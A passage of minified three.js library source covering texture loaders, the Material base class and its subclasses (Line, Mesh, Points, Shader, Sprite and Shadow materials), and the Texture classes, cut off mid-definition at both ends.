THREE.DirectionalLight(b.color,b.intensity);break;case \"PointLight\":g=new THREE.PointLight(b.color,b.intensity,b.distance,b.decay);break;case \"SpotLight\":g=new THREE.SpotLight(b.color,b.intensity,b.distance,b.angle,b.penumbra,b.decay);break;case \"HemisphereLight\":g=new THREE.HemisphereLight(b.color,b.groundColor,b.intensity);break;case \"Mesh\":g=e(b.geometry);var h=f(b.material);g=g.bones&&0<g.bones.length?new THREE.SkinnedMesh(g,\nh):new THREE.Mesh(g,h);break;case \"LOD\":g=new THREE.LOD;break;case \"Line\":g=new THREE.Line(e(b.geometry),f(b.material),b.mode);break;case \"PointCloud\":case \"Points\":g=new THREE.Points(e(b.geometry),f(b.material));break;case \"Sprite\":g=new THREE.Sprite(f(b.material));break;case \"Group\":g=new THREE.Group;break;default:g=new THREE.Object3D}g.uuid=b.uuid;void 0!==b.name&&(g.name=b.name);void 0!==b.matrix?(a.fromArray(b.matrix),a.decompose(g.position,g.quaternion,g.scale)):(void 0!==b.position&&g.position.fromArray(b.position),\nvoid 0!==b.rotation&&g.rotation.fromArray(b.rotation),void 0!==b.scale&&g.scale.fromArray(b.scale));void 0!==b.castShadow&&(g.castShadow=b.castShadow);void 0!==b.receiveShadow&&(g.receiveShadow=b.receiveShadow);void 0!==b.visible&&(g.visible=b.visible);void 0!==b.userData&&(g.userData=b.userData);if(void 0!==b.children)for(var k in b.children)g.add(this.parseObject(b.children[k],c,d));if(\"LOD\"===b.type)for(b=b.levels,h=0;h<b.length;h++){var l=b[h];k=g.getObjectByProperty(\"uuid\",l.object);void 0!==\nk&&g.addLevel(k,l.distance)}return g}}()});THREE.TextureLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};Object.assign(THREE.TextureLoader.prototype,{load:function(a,b,c,d){var e=new THREE.Texture,f=new THREE.ImageLoader(this.manager);f.setCrossOrigin(this.crossOrigin);f.setPath(this.path);f.load(a,function(a){e.image=a;e.needsUpdate=!0;void 0!==b&&b(e)},c,d);return e},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});\nTHREE.CubeTextureLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.CubeTextureLoader.prototype,{load:function(a,b,c,d){function e(c){g.load(a[c],function(a){f.images[c]=a;h++;6===h&&(f.needsUpdate=!0,b&&b(f))},void 0,d)}var f=new THREE.CubeTexture,g=new THREE.ImageLoader(this.manager);g.setCrossOrigin(this.crossOrigin);g.setPath(this.path);var h=0;for(c=0;c<a.length;++c)e(c);return f},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});\nTHREE.DataTextureLoader=THREE.BinaryTextureLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this._parser=null};\nObject.assign(THREE.BinaryTextureLoader.prototype,{load:function(a,b,c,d){var e=this,f=new THREE.DataTexture,g=new THREE.XHRLoader(this.manager);g.setResponseType(\"arraybuffer\");g.load(a,function(a){if(a=e._parser(a))void 0!==a.image?f.image=a.image:void 0!==a.data&&(f.image.width=a.width,f.image.height=a.height,f.image.data=a.data),f.wrapS=void 0!==a.wrapS?a.wrapS:THREE.ClampToEdgeWrapping,f.wrapT=void 0!==a.wrapT?a.wrapT:THREE.ClampToEdgeWrapping,f.magFilter=void 0!==a.magFilter?a.magFilter:THREE.LinearFilter,\nf.minFilter=void 0!==a.minFilter?a.minFilter:THREE.LinearMipMapLinearFilter,f.anisotropy=void 0!==a.anisotropy?a.anisotropy:1,void 0!==a.format&&(f.format=a.format),void 0!==a.type&&(f.type=a.type),void 0!==a.mipmaps&&(f.mipmaps=a.mipmaps),1===a.mipmapCount&&(f.minFilter=THREE.LinearFilter),f.needsUpdate=!0,b&&b(f,a)},c,d);return f}});THREE.CompressedTextureLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this._parser=null};\nObject.assign(THREE.CompressedTextureLoader.prototype,{load:function(a,b,c,d){function e(e){k.load(a[e],function(a){a=f._parser(a,!0);g[e]={width:a.width,height:a.height,format:a.format,mipmaps:a.mipmaps};l+=1;6===l&&(1===a.mipmapCount&&(h.minFilter=THREE.LinearFilter),h.format=a.format,h.needsUpdate=!0,b&&b(h))},c,d)}var f=this,g=[],h=new THREE.CompressedTexture;h.image=g;var k=new THREE.XHRLoader(this.manager);k.setPath(this.path);k.setResponseType(\"arraybuffer\");if(Array.isArray(a))for(var l=0,\nn=0,p=a.length;n<p;++n)e(n);else k.load(a,function(a){a=f._parser(a,!0);if(a.isCubemap)for(var c=a.mipmaps.length/a.mipmapCount,d=0;d<c;d++){g[d]={mipmaps:[]};for(var e=0;e<a.mipmapCount;e++)g[d].mipmaps.push(a.mipmaps[d*a.mipmapCount+e]),g[d].format=a.format,g[d].width=a.width,g[d].height=a.height}else h.image.width=a.width,h.image.height=a.height,h.mipmaps=a.mipmaps;1===a.mipmapCount&&(h.minFilter=THREE.LinearFilter);h.format=a.format;h.needsUpdate=!0;b&&b(h)},c,d);return h},setPath:function(a){this.path=\na;return this}});\nTHREE.Material=function(){Object.defineProperty(this,\"id\",{value:THREE.MaterialIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"Material\";this.lights=this.fog=!0;this.blending=THREE.NormalBlending;this.side=THREE.FrontSide;this.shading=THREE.SmoothShading;this.vertexColors=THREE.NoColors;this.opacity=1;this.transparent=!1;this.blendSrc=THREE.SrcAlphaFactor;this.blendDst=THREE.OneMinusSrcAlphaFactor;this.blendEquation=THREE.AddEquation;this.blendEquationAlpha=this.blendDstAlpha=\nthis.blendSrcAlpha=null;this.depthFunc=THREE.LessEqualDepth;this.depthWrite=this.depthTest=!0;this.clippingPlanes=null;this.clipShadows=!1;this.colorWrite=!0;this.precision=null;this.polygonOffset=!1;this.alphaTest=this.polygonOffsetUnits=this.polygonOffsetFactor=0;this.premultipliedAlpha=!1;this.overdraw=0;this._needsUpdate=this.visible=!0};\nTHREE.Material.prototype={constructor:THREE.Material,get needsUpdate(){return this._needsUpdate},set needsUpdate(a){!0===a&&this.update();this._needsUpdate=a},setValues:function(a){if(void 0!==a)for(var b in a){var c=a[b];if(void 0===c)console.warn(\"THREE.Material: '\"+b+\"' parameter is undefined.\");else{var d=this[b];void 0===d?console.warn(\"THREE.\"+this.type+\": '\"+b+\"' is not a property of this material.\"):d instanceof THREE.Color?d.set(c):d instanceof THREE.Vector3&&c instanceof THREE.Vector3?d.copy(c):\nthis[b]=\"overdraw\"===b?Number(c):c}}},toJSON:function(a){function b(a){var b=[],c;for(c in a){var d=a[c];delete d.metadata;b.push(d)}return b}var c=void 0===a;c&&(a={textures:{},images:{}});var d={metadata:{version:4.4,type:\"Material\",generator:\"Material.toJSON\"}};d.uuid=this.uuid;d.type=this.type;\"\"!==this.name&&(d.name=this.name);this.color instanceof THREE.Color&&(d.color=this.color.getHex());void 0!==this.roughness&&(d.roughness=this.roughness);void 0!==this.metalness&&(d.metalness=this.metalness);\nthis.emissive instanceof THREE.Color&&(d.emissive=this.emissive.getHex());this.specular instanceof THREE.Color&&(d.specular=this.specular.getHex());void 0!==this.shininess&&(d.shininess=this.shininess);this.map instanceof THREE.Texture&&(d.map=this.map.toJSON(a).uuid);this.alphaMap instanceof THREE.Texture&&(d.alphaMap=this.alphaMap.toJSON(a).uuid);this.lightMap instanceof THREE.Texture&&(d.lightMap=this.lightMap.toJSON(a).uuid);this.bumpMap instanceof THREE.Texture&&(d.bumpMap=this.bumpMap.toJSON(a).uuid,\nd.bumpScale=this.bumpScale);this.normalMap instanceof THREE.Texture&&(d.normalMap=this.normalMap.toJSON(a).uuid,d.normalScale=this.normalScale.toArray());this.displacementMap instanceof THREE.Texture&&(d.displacementMap=this.displacementMap.toJSON(a).uuid,d.displacementScale=this.displacementScale,d.displacementBias=this.displacementBias);this.roughnessMap instanceof THREE.Texture&&(d.roughnessMap=this.roughnessMap.toJSON(a).uuid);this.metalnessMap instanceof THREE.Texture&&(d.metalnessMap=this.metalnessMap.toJSON(a).uuid);\nthis.emissiveMap instanceof THREE.Texture&&(d.emissiveMap=this.emissiveMap.toJSON(a).uuid);this.specularMap instanceof THREE.Texture&&(d.specularMap=this.specularMap.toJSON(a).uuid);this.envMap instanceof THREE.Texture&&(d.envMap=this.envMap.toJSON(a).uuid,d.reflectivity=this.reflectivity);void 0!==this.size&&(d.size=this.size);void 0!==this.sizeAttenuation&&(d.sizeAttenuation=this.sizeAttenuation);this.blending!==THREE.NormalBlending&&(d.blending=this.blending);this.shading!==THREE.SmoothShading&&\n(d.shading=this.shading);this.side!==THREE.FrontSide&&(d.side=this.side);this.vertexColors!==THREE.NoColors&&(d.vertexColors=this.vertexColors);1>this.opacity&&(d.opacity=this.opacity);!0===this.transparent&&(d.transparent=this.transparent);0<this.alphaTest&&(d.alphaTest=this.alphaTest);!0===this.premultipliedAlpha&&(d.premultipliedAlpha=this.premultipliedAlpha);!0===this.wireframe&&(d.wireframe=this.wireframe);1<this.wireframeLinewidth&&(d.wireframeLinewidth=this.wireframeLinewidth);c&&(c=b(a.textures),\na=b(a.images),0<c.length&&(d.textures=c),0<a.length&&(d.images=a));return d},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.name=a.name;this.fog=a.fog;this.lights=a.lights;this.blending=a.blending;this.side=a.side;this.shading=a.shading;this.vertexColors=a.vertexColors;this.opacity=a.opacity;this.transparent=a.transparent;this.blendSrc=a.blendSrc;this.blendDst=a.blendDst;this.blendEquation=a.blendEquation;this.blendSrcAlpha=a.blendSrcAlpha;this.blendDstAlpha=a.blendDstAlpha;\nthis.blendEquationAlpha=a.blendEquationAlpha;this.depthFunc=a.depthFunc;this.depthTest=a.depthTest;this.depthWrite=a.depthWrite;this.colorWrite=a.colorWrite;this.precision=a.precision;this.polygonOffset=a.polygonOffset;this.polygonOffsetFactor=a.polygonOffsetFactor;this.polygonOffsetUnits=a.polygonOffsetUnits;this.alphaTest=a.alphaTest;this.premultipliedAlpha=a.premultipliedAlpha;this.overdraw=a.overdraw;this.visible=a.visible;this.clipShadows=a.clipShadows;a=a.clippingPlanes;var b=null;if(null!==\na)for(var c=a.length,b=Array(c),d=0;d!==c;++d)b[d]=a[d].clone();this.clippingPlanes=b;return this},update:function(){this.dispatchEvent({type:\"update\"})},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};Object.assign(THREE.Material.prototype,THREE.EventDispatcher.prototype);THREE.MaterialIdCount=0;\nTHREE.LineBasicMaterial=function(a){THREE.Material.call(this);this.type=\"LineBasicMaterial\";this.color=new THREE.Color(16777215);this.linewidth=1;this.linejoin=this.linecap=\"round\";this.lights=!1;this.setValues(a)};THREE.LineBasicMaterial.prototype=Object.create(THREE.Material.prototype);THREE.LineBasicMaterial.prototype.constructor=THREE.LineBasicMaterial;\nTHREE.LineBasicMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.linecap=a.linecap;this.linejoin=a.linejoin;return this};THREE.LineDashedMaterial=function(a){THREE.Material.call(this);this.type=\"LineDashedMaterial\";this.color=new THREE.Color(16777215);this.scale=this.linewidth=1;this.dashSize=3;this.gapSize=1;this.lights=!1;this.setValues(a)};THREE.LineDashedMaterial.prototype=Object.create(THREE.Material.prototype);\nTHREE.LineDashedMaterial.prototype.constructor=THREE.LineDashedMaterial;THREE.LineDashedMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.scale=a.scale;this.dashSize=a.dashSize;this.gapSize=a.gapSize;return this};\nTHREE.MeshBasicMaterial=function(a){THREE.Material.call(this);this.type=\"MeshBasicMaterial\";this.color=new THREE.Color(16777215);this.aoMap=this.map=null;this.aoMapIntensity=1;this.envMap=this.alphaMap=this.specularMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.lights=this.morphTargets=this.skinning=!1;this.setValues(a)};\nTHREE.MeshBasicMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshBasicMaterial.prototype.constructor=THREE.MeshBasicMaterial;\nTHREE.MeshBasicMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\nthis.skinning=a.skinning;this.morphTargets=a.morphTargets;return this};THREE.MeshDepthMaterial=function(a){THREE.Material.call(this);this.type=\"MeshDepthMaterial\";this.depthPacking=THREE.BasicDepthPacking;this.morphTargets=this.skinning=!1;this.displacementMap=this.alphaMap=this.map=null;this.displacementScale=1;this.displacementBias=0;this.wireframe=!1;this.wireframeLinewidth=1;this.lights=this.fog=!1;this.setValues(a)};THREE.MeshDepthMaterial.prototype=Object.create(THREE.Material.prototype);\nTHREE.MeshDepthMaterial.prototype.constructor=THREE.MeshDepthMaterial;THREE.MeshDepthMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.depthPacking=a.depthPacking;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.map=a.map;this.alphaMap=a.alphaMap;this.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return this};\nTHREE.MeshLambertMaterial=function(a){THREE.Material.call(this);this.type=\"MeshLambertMaterial\";this.color=new THREE.Color(16777215);this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new THREE.Color(0);this.emissiveIntensity=1;this.envMap=this.alphaMap=this.specularMap=this.emissiveMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\n\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshLambertMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshLambertMaterial.prototype.constructor=THREE.MeshLambertMaterial;\nTHREE.MeshLambertMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=\na.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};THREE.MeshNormalMaterial=function(a){THREE.Material.call(this,a);this.type=\"MeshNormalMaterial\";this.wireframe=!1;this.wireframeLinewidth=1;this.morphTargets=this.lights=this.fog=!1;this.setValues(a)};\nTHREE.MeshNormalMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshNormalMaterial.prototype.constructor=THREE.MeshNormalMaterial;THREE.MeshNormalMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return this};\nTHREE.MeshPhongMaterial=function(a){THREE.Material.call(this);this.type=\"MeshPhongMaterial\";this.color=new THREE.Color(16777215);this.specular=new THREE.Color(1118481);this.shininess=30;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new THREE.Color(0);this.emissiveIntensity=1;this.bumpMap=this.emissiveMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new THREE.Vector2(1,1);this.displacementMap=null;this.displacementScale=1;this.displacementBias=\n0;this.envMap=this.alphaMap=this.specularMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshPhongMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshPhongMaterial.prototype.constructor=THREE.MeshPhongMaterial;\nTHREE.MeshPhongMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.specular.copy(a.specular);this.shininess=a.shininess;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);\nthis.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;\nthis.morphNormals=a.morphNormals;return this};\nTHREE.MeshStandardMaterial=function(a){THREE.Material.call(this);this.defines={STANDARD:\"\"};this.type=\"MeshStandardMaterial\";this.color=new THREE.Color(16777215);this.metalness=this.roughness=.5;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new THREE.Color(0);this.emissiveIntensity=1;this.bumpMap=this.emissiveMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new THREE.Vector2(1,1);this.displacementMap=null;this.displacementScale=\n1;this.displacementBias=0;this.envMap=this.alphaMap=this.metalnessMap=this.roughnessMap=null;this.envMapIntensity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshStandardMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshStandardMaterial.prototype.constructor=THREE.MeshStandardMaterial;\nTHREE.MeshStandardMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.defines={STANDARD:\"\"};this.color.copy(a.color);this.roughness=a.roughness;this.metalness=a.metalness;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=\na.normalMap;this.normalScale.copy(a.normalScale);this.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.roughnessMap=a.roughnessMap;this.metalnessMap=a.metalnessMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.envMapIntensity=a.envMapIntensity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\nthis.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};THREE.MeshPhysicalMaterial=function(a){THREE.MeshStandardMaterial.call(this);this.defines={PHYSICAL:\"\"};this.type=\"MeshPhysicalMaterial\";this.reflectivity=.5;this.clearCoatRoughness=this.clearCoat=0;this.setValues(a)};THREE.MeshPhysicalMaterial.prototype=Object.create(THREE.MeshStandardMaterial.prototype);THREE.MeshPhysicalMaterial.prototype.constructor=THREE.MeshPhysicalMaterial;\nTHREE.MeshPhysicalMaterial.prototype.copy=function(a){THREE.MeshStandardMaterial.prototype.copy.call(this,a);this.defines={PHYSICAL:\"\"};this.reflectivity=a.reflectivity;this.clearCoat=a.clearCoat;this.clearCoatRoughness=a.clearCoatRoughness;return this};THREE.MultiMaterial=function(a){this.uuid=THREE.Math.generateUUID();this.type=\"MultiMaterial\";this.materials=a instanceof Array?a:[];this.visible=!0};\nTHREE.MultiMaterial.prototype={constructor:THREE.MultiMaterial,toJSON:function(a){for(var b={metadata:{version:4.2,type:\"material\",generator:\"MaterialExporter\"},uuid:this.uuid,type:this.type,materials:[]},c=this.materials,d=0,e=c.length;d<e;d++){var f=c[d].toJSON(a);delete f.metadata;b.materials.push(f)}b.visible=this.visible;return b},clone:function(){for(var a=new this.constructor,b=0;b<this.materials.length;b++)a.materials.push(this.materials[b].clone());a.visible=this.visible;return a}};\nTHREE.PointsMaterial=function(a){THREE.Material.call(this);this.type=\"PointsMaterial\";this.color=new THREE.Color(16777215);this.map=null;this.size=1;this.sizeAttenuation=!0;this.lights=!1;this.setValues(a)};THREE.PointsMaterial.prototype=Object.create(THREE.Material.prototype);THREE.PointsMaterial.prototype.constructor=THREE.PointsMaterial;\nTHREE.PointsMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.size=a.size;this.sizeAttenuation=a.sizeAttenuation;return this};\nTHREE.ShaderMaterial=function(a){THREE.Material.call(this);this.type=\"ShaderMaterial\";this.defines={};this.uniforms={};this.vertexShader=\"void main() {\\n\\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\\n}\";this.fragmentShader=\"void main() {\\n\\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\\n}\";this.linewidth=1;this.wireframe=!1;this.wireframeLinewidth=1;this.morphNormals=this.morphTargets=this.skinning=this.clipping=this.lights=this.fog=!1;this.extensions={derivatives:!1,fragDepth:!1,\ndrawBuffers:!1,shaderTextureLOD:!1};this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]};this.index0AttributeName=void 0;void 0!==a&&(void 0!==a.attributes&&console.error(\"THREE.ShaderMaterial: attributes should now be defined in THREE.BufferGeometry instead.\"),this.setValues(a))};THREE.ShaderMaterial.prototype=Object.create(THREE.Material.prototype);THREE.ShaderMaterial.prototype.constructor=THREE.ShaderMaterial;\nTHREE.ShaderMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.fragmentShader=a.fragmentShader;this.vertexShader=a.vertexShader;this.uniforms=THREE.UniformsUtils.clone(a.uniforms);this.defines=a.defines;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.lights=a.lights;this.clipping=a.clipping;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;this.extensions=a.extensions;return this};\nTHREE.ShaderMaterial.prototype.toJSON=function(a){a=THREE.Material.prototype.toJSON.call(this,a);a.uniforms=this.uniforms;a.vertexShader=this.vertexShader;a.fragmentShader=this.fragmentShader;return a};THREE.RawShaderMaterial=function(a){THREE.ShaderMaterial.call(this,a);this.type=\"RawShaderMaterial\"};THREE.RawShaderMaterial.prototype=Object.create(THREE.ShaderMaterial.prototype);THREE.RawShaderMaterial.prototype.constructor=THREE.RawShaderMaterial;\nTHREE.SpriteMaterial=function(a){THREE.Material.call(this);this.type=\"SpriteMaterial\";this.color=new THREE.Color(16777215);this.map=null;this.rotation=0;this.lights=this.fog=!1;this.setValues(a)};THREE.SpriteMaterial.prototype=Object.create(THREE.Material.prototype);THREE.SpriteMaterial.prototype.constructor=THREE.SpriteMaterial;THREE.SpriteMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.rotation=a.rotation;return this};\nTHREE.ShadowMaterial=function(){THREE.ShaderMaterial.call(this,{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.lights,{opacity:{value:1}}]),vertexShader:THREE.ShaderChunk.shadow_vert,fragmentShader:THREE.ShaderChunk.shadow_frag});this.transparent=this.lights=!0;Object.defineProperties(this,{opacity:{enumerable:!0,get:function(){return this.uniforms.opacity.value},set:function(a){this.uniforms.opacity.value=a}}})};THREE.ShadowMaterial.prototype=Object.create(THREE.ShaderMaterial.prototype);\nTHREE.ShadowMaterial.prototype.constructor=THREE.ShadowMaterial;\nTHREE.Texture=function(a,b,c,d,e,f,g,h,k,l){Object.defineProperty(this,\"id\",{value:THREE.TextureIdCount++});this.uuid=THREE.Math.generateUUID();this.sourceFile=this.name=\"\";this.image=void 0!==a?a:THREE.Texture.DEFAULT_IMAGE;this.mipmaps=[];this.mapping=void 0!==b?b:THREE.Texture.DEFAULT_MAPPING;this.wrapS=void 0!==c?c:THREE.ClampToEdgeWrapping;this.wrapT=void 0!==d?d:THREE.ClampToEdgeWrapping;this.magFilter=void 0!==e?e:THREE.LinearFilter;this.minFilter=void 0!==f?f:THREE.LinearMipMapLinearFilter;\nthis.anisotropy=void 0!==k?k:1;this.format=void 0!==g?g:THREE.RGBAFormat;this.type=void 0!==h?h:THREE.UnsignedByteType;this.offset=new THREE.Vector2(0,0);this.repeat=new THREE.Vector2(1,1);this.generateMipmaps=!0;this.premultiplyAlpha=!1;this.flipY=!0;this.unpackAlignment=4;this.encoding=void 0!==l?l:THREE.LinearEncoding;this.version=0;this.onUpdate=null};THREE.Texture.DEFAULT_IMAGE=void 0;THREE.Texture.DEFAULT_MAPPING=THREE.UVMapping;\nTHREE.Texture.prototype={constructor:THREE.Texture,set needsUpdate(a){!0===a&&this.version++},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.image=a.image;this.mipmaps=a.mipmaps.slice(0);this.mapping=a.mapping;this.wrapS=a.wrapS;this.wrapT=a.wrapT;this.magFilter=a.magFilter;this.minFilter=a.minFilter;this.anisotropy=a.anisotropy;this.format=a.format;this.type=a.type;this.offset.copy(a.offset);this.repeat.copy(a.repeat);this.generateMipmaps=a.generateMipmaps;this.premultiplyAlpha=\na.premultiplyAlpha;this.flipY=a.flipY;this.unpackAlignment=a.unpackAlignment;this.encoding=a.encoding;return this},toJSON:function(a){if(void 0!==a.textures[this.uuid])return a.textures[this.uuid];var b={metadata:{version:4.4,type:\"Texture\",generator:\"Texture.toJSON\"},uuid:this.uuid,name:this.name,mapping:this.mapping,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],wrap:[this.wrapS,this.wrapT],minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy};\nif(void 0!==this.image){var c=this.image;void 0===c.uuid&&(c.uuid=THREE.Math.generateUUID());if(void 0===a.images[c.uuid]){var d=a.images,e=c.uuid,f=c.uuid,g;void 0!==c.toDataURL?g=c:(g=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\"),g.width=c.width,g.height=c.height,g.getContext(\"2d\").drawImage(c,0,0,c.width,c.height));g=2048<g.width||2048<g.height?g.toDataURL(\"image/jpeg\",.6):g.toDataURL(\"image/png\");d[e]={uuid:f,url:g}}b.image=c.uuid}return a.textures[this.uuid]=b},dispose:function(){this.dispatchEvent({type:\"dispose\"})},\ntransformUv:function(a){if(this.mapping===THREE.UVMapping){a.multiply(this.repeat);a.add(this.offset);if(0>a.x||1<a.x)switch(this.wrapS){case THREE.RepeatWrapping:a.x-=Math.floor(a.x);break;case THREE.ClampToEdgeWrapping:a.x=0>a.x?0:1;break;case THREE.MirroredRepeatWrapping:1===Math.abs(Math.floor(a.x)%2)?a.x=Math.ceil(a.x)-a.x:a.x-=Math.floor(a.x)}if(0>a.y||1<a.y)switch(this.wrapT){case THREE.RepeatWrapping:a.y-=Math.floor(a.y);break;case THREE.ClampToEdgeWrapping:a.y=0>a.y?0:1;break;case THREE.MirroredRepeatWrapping:1===\nMath.abs(Math.floor(a.y)%2)?a.y=Math.ceil(a.y)-a.y:a.y-=Math.floor(a.y)}this.flipY&&(a.y=1-a.y)}}};Object.assign(THREE.Texture.prototype,THREE.EventDispatcher.prototype);THREE.TextureIdCount=0;\nTHREE.DepthTexture=function(a,b,c,d,e,f,g,h,k){THREE.Texture.call(this,null,d,e,f,g,h,THREE.DepthFormat,c,k);this.image={width:a,height:b};this.type=void 0!==c?c:THREE.UnsignedShortType;this.magFilter=void 0!==g?g:THREE.NearestFilter;this.minFilter=void 0!==h?h:THREE.NearestFilter;this.generateMipmaps=this.flipY=!1};THREE.DepthTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DepthTexture.prototype.constructor=THREE.DepthTexture;\nTHREE.CanvasTexture=function(a,b,c,d,e,f,g,h,k){THREE.Texture.call(this,a,b,c,d,e,f,g,h,k);this.needsUpdate=!0};THREE.CanvasTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CanvasTexture.prototype.constructor=THREE.CanvasTexture;THREE.CubeTexture=function(a,b,c,d,e,f,g,h,k,l){a=void 0!==a?a:[];b=void 0!==b?b:THREE.CubeReflectionMapping;THREE.Texture.call(this,a,b,c,d,e,f,g,h,k,l);this.flipY=!1};THREE.CubeTexture.prototype=Object.create(THREE.Texture.prototype);\nTHREE.CubeTexture.prototype.constructor=THREE.CubeTexture;Object.defineProperty(THREE.CubeTexture.prototype,\"images\",{get:function(){return 